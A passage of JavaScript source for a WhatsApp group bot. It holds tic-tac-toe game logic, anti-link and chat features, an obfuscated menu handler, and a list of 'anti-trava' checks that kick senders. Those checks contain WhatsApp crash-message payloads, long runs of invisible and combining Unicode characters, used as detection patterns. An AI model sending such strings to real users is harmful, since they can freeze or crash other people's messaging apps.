‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
		if (budy.includes(`Wa.me/559891312574`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
		if (budy.includes(`www.instagram.com/p/CE6f8afF85G/?igshid=4p33q69wr89q`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
		if (budy.includes(`JXgH0fuabFR5VijfrdwyxY`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
	
			if (budy.includes(`images.app.goo.gl/d3sU6Z6hgbVmPwx79`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
	
			if (budy.includes(`www.instagram.com/p/CE0pVKZs5Wk/?igshid=5ihhd4xdsgrh`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
		
		if (budy.includes(`www.instagram.com/p/CE9OsNblDcq`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
		
				if (budy.includes(`www.facebook.com/mohamed.faslan.121772`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
		
			
					if (budy.includes(`ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝‎ᡃ⃟‎ᡃ⃝`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
					
	//vvv
		if (budy.includes(`pinterest.com/detetive`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		

		if (budy.includes(`lol.davizinmaker.ml/nagazap`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		

		if (budy.includes(`www.instagram.com/p/CMx2kO9pnW-/?utm_source=ig_web_copy_link`)) {
		if (!isGroup) return
		if (!isTrava) return
			cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}		
			
					
					
		  
	if (budy.includes(`ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ`)) {
		if (!isGroup) return
		if (!isTrava) return
		cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}	     
		        
		              
		         if (budy.includes(`🆇҉⃟⃢🅲҉⃟⃢🅻҉⃟⃢`)) {
		if (!isGroup) return
		if (!isTrava) return
		cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}

		       	
if	 (budy.includes(`www.instagram.com/p/CE0pVKZs5Wk/?igshid=5ihhd4xdsgrh🅻҉⃟⃢🅸҉⃟⃢🅽҉⃟⃢🆄҉⃟⃢🆇҉⃟⃢🅲҉⃟⃢🅻҉⃟⃢🅰҉⃟⃢🅽҉⃟⃢tratrav🔯🔯🔯🔯🔯🔯🔯🔯🔯🔯🔯🔯🔯🔯🔯🔯??🔯🔯🔯🔯`)) {
		if (!isGroup) return
		if (!isTrava) return
		cnf.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		cnf.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}       	          			   			
		      		       	          														   											   






}


	
		if (isTTT && isPlayer2){
if (budy.startsWith('Y')){
  tto = ky_ttt.filter(ghg => ghg.id.includes(from))
  tty = tto[0]
  angka = tto[0].angka
  ucapan = `*🎳 Juego Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=❌
Player2 @${tty.player2.split('@')[0]}=⭕

${angka[1]}${angka[2]}${angka[3]}
${angka[4]}${angka[5]}${angka[6]}
${angka[7]}${angka[8]}${angka[9]}

Turno de = @${tty.player1.split('@')[0]}`
  cnf.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
  }
if (budy.startsWith('N')){
tto = ky_ttt.filter(ghg => ghg.id.includes(from))
tty = tto[0]
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
cnf.sendMessage(from, `@${tty.player2.split('@')[0]} Se rehúsa:(`,text,{quoted:mek,contextInfo:{mentionedJid:[tty.player2]}})
}
}

const _0x2039a5=_0x22b6;(function(_0x9db4e8,_0x3165a4){const _0x5cb034=_0x22b6,_0x43021d=_0x9db4e8();while(!![]){try{const _0x4f286b=-parseInt(_0x5cb034(0x1be))/0x1+parseInt(_0x5cb034(0x1d8))/0x2*(-parseInt(_0x5cb034(0x1d3))/0x3)+parseInt(_0x5cb034(0x1cc))/0x4+parseInt(_0x5cb034(0x1e0))/0x5*(parseInt(_0x5cb034(0x1c5))/0x6)+parseInt(_0x5cb034(0x1bc))/0x7+parseInt(_0x5cb034(0x1bd))/0x8+-parseInt(_0x5cb034(0x1e7))/0x9;if(_0x4f286b===_0x3165a4)break;else _0x43021d['push'](_0x43021d['shift']());}catch(_0x2c9108){_0x43021d['push'](_0x43021d['shift']());}}}(_0x39d9,0xb98d4));button=='SOURCE\x20CODE'&&(console[_0x2039a5(0x1c8)](_0x2039a5(0x1e4)),confumods['sendMessage'](from,{'text':_0x2039a5(0x1da),'matchedText':_0x2039a5(0x1da),'description':'','title':_0x2039a5(0x1c7),'jpegThumbnail':ofrply},_0x2039a5(0x1c4),{'detectLinks':![],'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![]},'quoted':finv}));button=='MP3'&&(console['log'](_0x2039a5(0x1d2)),reply(mess[_0x2039a5(0x1e1)]),confumods[_0x2039a5(0x1cf)](from,anu3,audio,{'mimetype':_0x2039a5(0x1dc),'quoted':mek}));function _0x39d9(){const _0x212414=['Script','️LIST\x20MENU','sendMessage','user','Status','MP3','1299kwYfZn','\x0aitem1.TEL;waid=','MakerMenu','push','Developer\x20','3152eteMVX','SINGLE_SELECT','https://github.com/dcode-denpa/bitch-boot','prepareMessageFromContent','audio/mp4','MP4','GroupMenu','Hai\x20kak\x20','45pyDoPy','wait','notify','Jadibot','SOURCE\x20CODE','contactsArrayMessage','OwnerMenu','3368466xnSDyx','DownloadMenu','contacts','vname',',\x20Silahkan\x20pilih\x20menu\x20disini','3339875KRAxWB','4525568rJeYcJ','244909dLsGYf','relayWAMessage','OtherMenu','*_©\x20Dcode\x20Denpa_*','\x0aitem1.X-ABLabel:Ponsel\x0aEND:VCARD','split','extendedTextMessage','481554qazfTP','DEVELOPER','don\x27t\x20click\x20here\x20!!!','log','\x20-\x20','LIST\x20MENU','Creator','1185836IEdnLq'];_0x39d9=function(){return _0x212414;};return _0x39d9();}button==_0x2039a5(0x1dd)&&(console['log'](_0x2039a5(0x1dd)),reply(mess[_0x2039a5(0x1e1)]),confumods[_0x2039a5(0x1cf)](from,anu4,video,{'quoted':mek}));if(button==_0x2039a5(0x1c6)){console[_0x2039a5(0x1c8)](_0x2039a5(0x1c6));let ini_list=[];for(let i of ConfuMods){const vname=confumods[_0x2039a5(0x1e9)][i]!=undefined?confumods[_0x2039a5(0x1e9)][i][_0x2039a5(0x1ea)]||confumods[_0x2039a5(0x1e9)][i][_0x2039a5(0x1e2)]:undefined;ini_list[_0x2039a5(0x1d6)]({'displayName':_0x2039a5(0x1d7)+NamaBot,'vcard':'BEGIN:VCARD\x0aVERSION:3.0\x0aN:Sy;Dcode\x20Denpa;;;\x0aFN:'+(vname?''+vname:''+confumods[_0x2039a5(0x1d0)]['name'])+_0x2039a5(0x1d4)+i[_0x2039a5(0x1c3)]('@')[0x0]+':'+i['split']('@')[0x0]+_0x2039a5(0x1c2)});}confumods['sendMessage'](from,{'displayName':_0x2039a5(0x1d7)+NamaBot,'contacts':ini_list},_0x2039a5(0x1e5),{'quoted':mek,'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![]}});}function _0x22b6(_0x293272,_0x1e5921){const _0x39d9cd=_0x39d9();return _0x22b6=function(_0x22b6fe,_0x5823d5){_0x22b6fe=_0x22b6fe-0x1bb;let _0x3a1107=_0x39d9cd[_0x22b6fe];return _0x3a1107;},_0x22b6(_0x293272,_0x1e5921);}if(button==_0x2039a5(0x1ca)){console[_0x2039a5(0x1c8)](_0x2039a5(0x1ca));let bitch=confumods[_0x2039a5(0x1db)](from,{'listMessage':{'title':'','description':_0x2039a5(0x1df)+pushname+_0x2039a5(0x1bb),'buttonText':_0x2039a5(0x1ce),'footerText':_0x2039a5(0x1c1),'listType':_0x2039a5(0x1d9),'sections':[{'title':jmn+'\x20-\x20'+week+'\x20'+weton+_0x2039a5(0x1c9)+calender,'rows':[{'title':_0x2039a5(0x1cd),'rowId':''},{'title':'Speed','rowId':''},{'title':_0x2039a5(0x1d1),'rowId':''},{'title':_0x2039a5(0x1cb),'rowId':''},{'title':_0x2039a5(0x1e3),'rowId':''},{'title':'Runtime','rowId':''},{'title':_0x2039a5(0x1e6),'rowId':''},{'title':_0x2039a5(0x1d5),'rowId':''},{'title':_0x2039a5(0x1de),'rowId':''},{'title':_0x2039a5(0x1c0),'rowId':''},{'title':_0x2039a5(0x1e8),'rowId':''}]}]}},{});confumods[_0x2039a5(0x1bf)](bitch);}
if (isTTT && isPlayer1){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Ingrese los números correctamente')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Ya lleno, los otros contenidos')
if (main[0].gilir.includes(sender)) return reply('Espera tu turno')
s = '❌'
main[0].angka[nuber] = s
main[0].gilir = main[0].player1
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*🎳Resultado del juego Tictactoe 🎲

*Yeyyy el ganador es *@${tty.player1.split('@')[0]}*\n`
ucapan2 = `*🎳Resultado del juego Tictactoe 🎲*

*El resultado final:*

${ttt}`
cnf.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player1]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()

if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()

if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()

if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()

if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()

if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()

if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()

if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()

if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*_Empate🥀_*`
ucapan2 = `*🎳 Resultado del juego Tictactoe 🎲*

*El resultado final:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Juego Tictactoe 🎲*

Player2 @${tty.player2.split('@')[0]}=⭕
Player1 @${tty.player1.split('@')[0]}=❌

${ttt}

Turno de = @${tty.player2.split('@')[0]}`
 cnf.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
}
if (isTTT && isPlayer2){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Ingrese los números correctamente')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Ya lleno, los otros contenidos 🥺')
if (main[0].gilir.includes(sender)) return reply('Espera tu turno 🥀')
s = '⭕'
main[0].angka[nuber] = s
main[0].gilir = main[0].player2
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*🎳 Resultado del juego Tictactoe 🎲*

*Yeyyy el ganador es @${tty.player2.split('@')[0]}*\n`
ucapan2 = `*🎳 Juego Tictactoe 🎲*

*El resultado final:*

${ttt}`
cnf.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player2]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳Resultado del juego Tictactoe ??*

*_Serie de juegos_* `
speech2 = `*🎳 Resultado del juego Tictactoe*

*El resultado final:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Juego Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=⭕
Player2 @${tty.player2.split('@')[0]}=❌

${ttt}
 
Turno de = @${tty.player1.split('@')[0]}`
 cnf.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
 }

        if (budy.includes('.com')){
					if (!isGroup) return
					if (!isAntiLink) return
					if (isGroupAdmins) return reply('Te salvaste eres admin 🧐')
										var kic = `${sender.split("@")[0]}@s.whatsapp.net`
					reply(`Enlace detectado 🗡️ @${sender.split("@")[0]}`)
					cnf.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)
					}, 0)
				    }


					if (isGroup && isSimi && budy != undefined) {
						console.log(budy)
						muehe = await simih(budy)
						console.log(muehe)
						reply(muehe)
					} else {
						return //console.log(color('[WARN]','red'), 'Unregistered Command from', color(sender.split('@')[0]))
					}
                           
                           
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})
}
starts()
